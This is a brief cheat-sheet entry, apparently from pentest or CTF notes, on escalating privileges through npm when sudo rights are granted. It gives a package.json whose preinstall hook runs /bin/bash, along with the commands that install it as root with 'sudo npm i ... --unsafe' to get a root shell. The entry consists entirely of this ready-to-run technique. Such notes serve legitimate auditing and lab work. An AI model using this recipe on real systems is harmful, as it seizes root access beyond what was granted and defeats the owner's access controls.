---
title: "npm"
date: 2024-6-26
tags: ["npm", "nodejs", "privesc", "sudo"]
---

---
### npm

#### Privilege Escalation

Create a `package.json`

```json
{
  "name": "root",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "/bin/bash"
  }
}
```

```bash
mkdir test
mv package.json test/
sudo npm i test/ --unsafe
```

<br>